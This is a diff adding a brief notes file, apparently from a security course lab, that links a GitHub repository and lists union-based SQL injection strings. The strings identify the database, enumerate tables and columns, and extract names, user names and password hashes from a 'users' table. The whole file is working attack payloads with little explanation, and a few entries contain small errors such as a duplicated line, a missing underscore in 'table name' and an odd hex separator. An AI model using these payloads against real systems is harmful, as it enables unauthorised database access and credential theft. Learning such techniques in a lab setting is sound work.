@@ -1,0 +1,16 @@
+https://github.com/SidhantKarbotkar/cns-sid
+
+//for records
+1' union select null, database() #
+
+//for database
+1' union select null, database() #
+
+//for table information
+1' union select null,table_name from information_schema.tables #
+
+//for column content
+1' union select null, concat(table_name,0x21e,column_name) from information_schema.columns where table name='users' #
+
+//for column admin and hash password
+1' and 1=0 union select  null,concat(first_name,0x2e,last_name,0x0a,user,0x3a,password) from users #
